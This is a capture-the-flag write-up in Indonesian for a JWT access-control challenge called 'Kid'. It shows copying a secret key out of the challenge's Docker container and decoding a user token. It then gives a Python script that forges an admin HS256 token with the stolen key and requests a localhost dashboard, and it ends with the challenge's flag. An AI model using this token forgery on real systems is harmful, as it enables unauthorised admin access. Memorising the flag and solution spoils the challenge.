# WriteUp - Kid

## Overview

* **Judul:** Kid
* **Kategori:** Access Control
* **Poin:** 25
* **Deskripsi:** Bongkar rahasia admin.
* **URL:** `http://localhost:1337`

## Reconnaissance

### 1. Key Extraction

Pemeriksaan awal dilakukan pada file sistem di dalam Docker container. Ditemukan file kunci rahasia pada direktori `keys/`.

```bash
# List file dalam container
docker exec kid-web-1 ls -la keys/
# Output: secret.key

# Copy file ke host
docker cp kid-web-1:app/keys/secret.key ./secret.key

```

### 2. JWT Analysis

Setelah login sebagai user biasa, server memberikan cookie `token` berupa JWT.
Decoding token menunjukkan algoritma dan struktur header:

* **Header:**
```json
{
  "alg": "HS256",
  "kid": "keys/secret.key",
  "typ": "JWT"
}

```


* **Payload:**
```json
{
  "username": "WanZKey",
  "role": "user",
  "exp": 1770213178
}

```



## Vulnerability Analysis

Aplikasi menggunakan algoritma **HS256** (Symmetric Key) untuk tanda tangan JWT. Keamanan algoritma ini bergantung sepenuhnya pada kerahasiaan *secret key*.

Karena file `secret.key` terekspos dan berhasil diekstrak dari container, penyerang dapat membuat token JWT baru dengan payload sembarang (misalnya mengubah `role` menjadi `admin`) dan menandatanganinya menggunakan kunci tersebut. Server akan memvalidasi token tersebut sebagai token yang sah.

## Exploitation

Script berikut digunakan untuk membuat token admin palsu (*forged token*) menggunakan kunci yang dicuri.

```python
import requests
import jwt # pip install pyjwt
import time

TARGET_URL = "http://localhost:1337"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"

# Load Secret Key
with open("secret.key", "rb") as f:
    SECRET_KEY = f.read()

def exploit():
    # Payload: Ubah role menjadi admin
    payload = {
        "username": "admin",
        "role": "admin",
        "exp": int(time.time()) + 3600
    }
    
    # Header: Pastikan kid sesuai dengan target
    headers = {
        "kid": "keys/secret.key"
    }
    
    # Sign token baru
    forged_token = jwt.encode(
        payload, 
        SECRET_KEY, 
        algorithm="HS256", 
        headers=headers
    )
    
    print(f"[+] Forged Token: {forged_token}")
    
    # Kirim ke Dashboard
    cookies = {"token": forged_token}
    r = requests.get(DASHBOARD_URL, cookies=cookies)
    
    if "pwn{" in r.text:
        print("\n[+] PWNED! Flag Found:")
        for line in r.text.splitlines():
            if "pwn{" in line:
                print(line.strip())

if __name__ == "__main__":
    exploit()

```

## Flag

```
pwn{bc04238ce9e0a624f64e36a715e766da}

```
